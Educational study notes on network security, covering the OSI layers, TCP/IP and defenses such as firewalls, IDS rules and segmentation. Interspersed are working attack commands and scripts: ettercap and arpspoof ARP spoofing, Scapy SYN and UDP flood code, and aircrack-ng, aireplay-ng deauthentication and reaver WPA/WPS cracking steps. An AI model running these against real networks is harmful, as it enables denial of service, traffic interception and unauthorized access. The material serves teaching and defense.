# Detailed Notes: Network Security

## Network Fundamentals - Deep Technical Analysis

### OSI Model - Comprehensive Layer Analysis

#### Layer 1: Physical Layer
**Purpose**: Transmission of raw bit streams over physical medium

**Components:**
- Cables (copper, fiber optic)
- Hubs and repeaters
- Network interface cards (NICs)
- Wireless transceivers

**Security Considerations:**
- Physical access controls
- Cable tapping and wiretapping
- Electromagnetic interference (EMI)
- Tempest attacks (electromagnetic eavesdropping)

**Attack Vectors:**
- Cable cutting/damage
- Unauthorized physical access
- Signal interception
- Hardware implants

**Defensive Measures:**
- Physical security controls
- Cable shielding
- Faraday cages for sensitive areas
- Hardware integrity monitoring

#### Layer 2: Data Link Layer
**Purpose**: Node-to-node delivery within same network segment

**Protocols:**
- Ethernet (IEEE 802.3)
- WiFi (IEEE 802.11)
- Point-to-Point Protocol (PPP)
- Frame Relay

**Key Concepts:**
- MAC addresses (48-bit hardware addresses)
- Switching and bridging
- Virtual LANs (VLANs)
- Spanning Tree Protocol (STP)

**Security Vulnerabilities:**
```
ARP Spoofing Example:
1. Attacker sends fake ARP responses
2. Associates attacker's MAC with victim's IP
3. Traffic redirected through attacker
4. Man-in-the-middle position achieved
```

**Layer 2 Attacks:**
- ARP poisoning/spoofing
- MAC flooding
- VLAN hopping
- STP manipulation
- CAM table overflow

**Defensive Technologies:**
- Port security (MAC address limiting)
- Dynamic ARP inspection
- DHCP snooping
- Private VLANs
- 802.1X authentication

#### Layer 3: Network Layer
**Purpose**: Routing between different networks

**Primary Protocol**: Internet Protocol (IP)
- IPv4: 32-bit addresses (192.168.1.1)
- IPv6: 128-bit addresses (2001:db8::1)

**Routing Protocols:**
- OSPF (Open Shortest Path First)
- BGP (Border Gateway Protocol)
- EIGRP (Enhanced Interior Gateway Routing Protocol)
- RIP (Routing Information Protocol)

**Security Mechanisms:**
- IPSec (IP Security) protocol suite
- Access Control Lists (ACLs)
- Route filtering
- Network segmentation

**Layer 3 Attacks:**
```bash
# IP spoofing example
# Crafting packets with false source IP
scapy_packet = IP(src="spoofed_ip", dst="target_ip")/TCP()
```

**Attack Categories:**
- IP spoofing
- Routing table poisoning
- BGP hijacking
- ICMP-based attacks
- Fragmentation attacks

#### Layer 4: Transport Layer
**Purpose**: End-to-end reliable delivery

**Primary Protocols:**

**TCP (Transmission Control Protocol):**
- Connection-oriented
- Reliable delivery with acknowledgments
- Flow control and congestion control
- Three-way handshake establishment

**TCP Handshake Process:**
```
Client → Server: SYN (seq=x)
Server → Client: SYN-ACK (seq=y, ack=x+1)
Client → Server: ACK (seq=x+1, ack=y+1)
```

**UDP (User Datagram Protocol):**
- Connectionless
- Unreliable but fast delivery
- No flow control or acknowledgments
- Lower overhead than TCP

**Layer 4 Security:**
- Port-based filtering
- Stateful inspection
- TCP sequence number randomization
- Connection rate limiting

**Transport Layer Attacks:**
- TCP SYN flooding
- TCP session hijacking
- UDP flooding
- Port scanning
- Connection exhaustion

#### Layers 5-7: Session, Presentation, Application
**Layer 5 - Session Management:**
- NetBIOS sessions
- SQL sessions
- RPC sessions
- Session tokens and cookies

**Layer 6 - Data Presentation:**
- Encryption/decryption
- Compression
- Character encoding
- Data format translation

**Layer 7 - Application Services:**
- HTTP/HTTPS
- FTP/SFTP
- SMTP/POP3/IMAP
- DNS
- DHCP

### TCP/IP Protocol Suite - Detailed Analysis

#### Internet Protocol (IP) - Deep Dive

**IPv4 Header Structure:**
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Key Fields for Security:**
- **Source/Destination Address**: Can be spoofed
- **Protocol**: Identifies next layer protocol
- **TTL**: Prevents infinite routing loops
- **Flags**: Control fragmentation
- **Options**: Can contain security-relevant data

**IPv4 Address Classes and Security Implications:**
```
Class A: 1.0.0.0 to 126.255.255.255 (/8)
Class B: 128.0.0.0 to 191.255.255.255 (/16)
Class C: 192.0.0.0 to 223.255.255.255 (/24)

Private Address Ranges (RFC 1918):
10.0.0.0/8 (Class A private)
172.16.0.0/12 (Class B private)
192.168.0.0/16 (Class C private)
```

**IPv6 Security Enhancements:**
- IPSec integration (mandatory in original spec)
- No broadcast (multicast instead)
- Built-in address autoconfiguration
- Improved header format
- Extension headers for additional functionality

#### TCP Security Mechanisms and Vulnerabilities

**TCP State Machine:**
```
CLOSED → LISTEN → SYN-RECEIVED → ESTABLISHED → FIN-WAIT-1 → FIN-WAIT-2 → TIME-WAIT → CLOSED
```

**Security-Critical TCP Fields:**
- **Sequence Numbers**: Must be unpredictable
- **Acknowledgment Numbers**: Confirm received data
- **Window Size**: Flow control mechanism
- **Flags**: Control connection state

**TCP Security Vulnerabilities:**

**1. Sequence Number Prediction:**
```python
# Historical vulnerability (now fixed)
# Predictable sequence numbers allowed hijacking
initial_seq = 12345
next_seq = initial_seq + 64000  # Predictable increment
```

**2. TCP SYN Flooding:**
```
Attack Process:
1. Attacker sends multiple SYN packets
2. Server allocates resources for half-open connections
3. Server's connection table fills up
4. Legitimate connections denied
```

**Mitigations:**
- SYN cookies
- SYN proxy protection
- Rate limiting
- Resource allocation limits

**3. TCP Reset Attacks:**
```
Reset Attack Process:
1. Attacker observes legitimate connection
2. Crafts RST packet with correct sequence number
3. Connection forcibly terminated
4. Denial of service achieved
```

### Network Attack Techniques - Comprehensive Analysis

#### Man-in-the-Middle (MITM) Attacks

**1. ARP Spoofing/Poisoning**

**Attack Mechanism:**
```bash
# ARP spoofing with ettercap
ettercap -T -M arp /192.168.1.1/ /192.168.1.100/

# Manual ARP spoofing
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

**Technical Process:**
1. Attacker sends gratuitous ARP responses
2. Victim machines update ARP tables
3. Traffic redirected through attacker
4. Attacker can intercept, modify, or relay traffic

**Detection Methods:**
- ARP table monitoring
- Static ARP entries
- Network monitoring tools
- Anomaly detection

**Prevention Techniques:**
- Dynamic ARP Inspection (DAI)
- Port security
- Static ARP entries for critical systems
- Network segmentation

**2. DNS Spoofing**

**Attack Vectors:**
```bash
# DNS cache poisoning
# Attacker responds faster than legitimate DNS server
dig @target_dns_server malicious_domain.com

# Local DNS spoofing
echo "192.168.1.100 legitimate-site.com" >> /etc/hosts
```

**DNS Security Extensions (DNSSEC):**
- Cryptographic signatures
- Chain of trust from root
- Authentication of DNS responses
- Integrity protection

**3. SSL/TLS Interception**

**SSL Stripping Attack:**
```
Process:
1. User connects to HTTP site
2. Attacker intercepts redirect to HTTPS
3. Attacker maintains HTTP connection to user
4. Attacker establishes HTTPS connection to server
5. User unaware of missing encryption
```

**Certificate-Based Attacks:**
- Rogue certificate authorities
- Certificate pinning bypass
- Weak certificate validation
- Self-signed certificate acceptance

**Prevention:**
- HTTP Strict Transport Security (HSTS)
- Certificate pinning
- Certificate transparency logs
- Public key pinning

#### Denial of Service (DoS) Attacks

**1. Network Layer DoS**

**SYN Flood Attack:**
```python
# SYN flood example (educational)
from scapy.all import *

def syn_flood(target_ip, target_port):
    for i in range(1000):
        src_ip = ".".join([str(random.randint(1,254)) for _ in range(4)])
        packet = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
        send(packet, verbose=0)
```

**SYN Flood Characteristics:**
- Exploits TCP three-way handshake
- Exhausts server connection table
- Uses spoofed source addresses
- Difficult to trace back to source

**UDP Flood Attack:**
```python
# UDP flood example (educational)
def udp_flood(target_ip, target_port):
    packet = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="X"*1024)
    send(packet, loop=1, verbose=0)
```

**2. Application Layer DoS**

**HTTP Flood Attacks:**
- Slowloris: Slow HTTP headers
- R.U.D.Y.: Slow HTTP POST
- HTTP GET flood
- SSL/TLS handshake exhaustion

**Application-Specific Attacks:**
- Database query exhaustion
- Memory exhaustion
- CPU exhaustion
- Bandwidth exhaustion

**3. Distributed Denial of Service (DDoS)**

**DDoS Architecture:**
```
Command & Control Server
        ↓
    Botmaster
        ↓
   Bot Network (1000s of compromised machines)
        ↓
    Target System
```

**DDoS Attack Types:**
- Volumetric attacks (bandwidth exhaustion)
- Protocol attacks (resource exhaustion)
- Application layer attacks (service exhaustion)

**DDoS Mitigation Strategies:**
- Rate limiting and throttling
- Content Delivery Networks (CDNs)
- DDoS protection services
- Traffic analysis and filtering
- Anycast networks

#### Wireless Network Security

**1. WiFi Security Protocols Evolution**

**WEP (Wired Equivalent Privacy):**
- 40-bit or 104-bit keys
- RC4 stream cipher
- Cryptographically broken
- Vulnerable to key recovery attacks

**WPA (WiFi Protected Access):**
- TKIP (Temporal Key Integrity Protocol)
- Per-packet key mixing
- Message integrity checks
- Backward compatible with WEP hardware

**WPA2 (WPA version 2):**
- AES-CCMP encryption
- PBKDF2 key derivation
- Stronger authentication
- Still vulnerable to offline attacks

**WPA3 (Latest standard):**
- Simultaneous Authentication of Equals (SAE)
- Forward secrecy
- Stronger encryption (GCMP-256)
- Protection against offline attacks

**2. Wireless Attack Techniques**

**Wardriving and Site Survey:**
```bash
# Wireless network discovery
iwlist scan
airodump-ng wlan0

# GPS mapping with Kismet
kismet -t "GPS enabled survey"
```

**WPA/WPA2 Attacks:**
```bash
# Handshake capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0

# Deauthentication attack
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0

# Dictionary attack
aircrack-ng -w wordlist.txt capture-01.cap
```

**Evil Twin Attacks:**
```bash
# Create rogue access point
hostapd rogue_ap.conf

# Captive portal setup
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:8080
```

**WPS Attacks:**
```bash
# WPS PIN attack
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv

# Pixie dust attack
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -K
```

### Network Defense Strategies

#### Firewall Technologies

**1. Packet Filtering Firewalls**

**Stateless Filtering:**
```bash
# iptables examples
# Allow HTTP traffic
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Block specific source
iptables -A INPUT -s 192.168.1.100 -j DROP

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
```

**Limitations:**
- No connection state tracking
- Vulnerable to connection-based attacks
- Limited application awareness
- Basic rule-based filtering only

**2. Stateful Inspection Firewalls**

**Connection State Tracking:**
```
Connection Table Example:
Protocol | Source IP    | Source Port | Dest IP      | Dest Port | State
TCP      | 192.168.1.100| 1234       | 10.0.0.1     | 80        | ESTABLISHED
TCP      | 192.168.1.101| 1235       | 10.0.0.2     | 443       | SYN_SENT
UDP      | 192.168.1.102| 1236       | 8.8.8.8      | 53        | NEW
```

**Advantages:**
- Connection context awareness
- Better security than packet filtering
- Protection against connection-based attacks
- Dynamic rule application

**3. Application Layer Firewalls**

**Deep Packet Inspection (DPI):**
- Content analysis
- Protocol validation
- Application identification
- Malware detection

**Web Application Firewalls (WAF):**
```
WAF Rule Examples:
- Block SQL injection patterns
- Prevent XSS attacks
- Rate limit requests
- Validate input parameters
- Check HTTP methods and headers
```

**4. Next-Generation Firewalls (NGFW)**

**Integrated Capabilities:**
- Traditional firewall features
- Intrusion Prevention System (IPS)
- Application awareness and control
- User identity integration
- Advanced threat protection
- SSL/TLS inspection

#### Intrusion Detection and Prevention Systems

**1. Signature-Based Detection**

**Pattern Matching:**
```
Example IDS Rules (Snort format):
alert tcp any any -> any 80 (content:"GET /"; content:"admin"; msg:"Admin page access attempt";)
alert tcp any any -> any any (content:"|90 90 90 90|"; msg:"NOP sled detected";)
```

**Advantages:**
- High accuracy for known attacks
- Low false positive rate
- Precise attack identification
- Detailed attack information

**Limitations:**
- Cannot detect unknown attacks
- Requires regular signature updates
- Vulnerable to evasion techniques
- High maintenance overhead

**2. Anomaly-Based Detection**

**Behavioral Analysis:**
- Network traffic patterns
- System behavior baselines
- User activity profiles
- Protocol behavior analysis

**Machine Learning Approaches:**
```python
# Example anomaly detection concept
def detect_anomaly(network_traffic):
    baseline = establish_baseline(historical_traffic)
    current_behavior = analyze_traffic(network_traffic)
    deviation = calculate_deviation(current_behavior, baseline)
    
    if deviation > threshold:
        trigger_alert("Anomalous behavior detected")
```

**Statistical Methods:**
- Standard deviation analysis
- Time series analysis
- Frequency analysis
- Correlation analysis

**3. Hybrid Detection Systems**

**Combined Approaches:**
- Signature detection for known threats
- Anomaly detection for unknown threats
- Reputation-based detection
- Heuristic analysis

**Advanced Features:**
- Machine learning integration
- Threat intelligence feeds
- Automated response capabilities
- Forensic data collection

#### Network Segmentation Strategies

**1. Physical Segmentation**
- Separate physical networks
- Air-gapped systems
- Dedicated hardware per segment
- Physical access controls

**2. Logical Segmentation**
- VLANs (Virtual LANs)
- Software-defined networking (SDN)
- Virtual firewalls
- Network access control (NAC)

**3. Micro-Segmentation**
- Zero-trust network principles
- Application-level segmentation
- Container network isolation
- East-west traffic inspection

**Implementation Examples:**
```
Network Segmentation Design:
- DMZ: Public-facing services (web servers)
- Internal Network: Employee workstations
- Server Network: Critical business servers
- Management Network: Network infrastructure
- Guest Network: Visitor access
```
